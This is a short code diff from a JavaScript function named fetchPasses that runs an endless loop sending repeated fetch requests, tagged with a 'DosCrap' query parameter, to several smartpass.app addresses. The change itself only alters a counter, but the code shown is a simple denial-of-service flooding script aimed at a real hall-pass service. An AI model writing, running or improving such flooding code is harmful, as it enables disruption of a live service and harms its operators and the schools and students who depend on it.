@@ -4,7 +4,7 @@ async function fetchPasses() {
             console.log(textt)
             var x = 0
             while (true) {
-                x+=1
+                x+=8
                 fetch("https://app.smartpass.app/main/passes" + "?DosCrap=" + textt);
                 fetch("https://www.smartpass.app/" + "?DosCrap=" + textt);
                 fetch("https://app.smartpass.app/main" + "?DosCrap=" + textt);
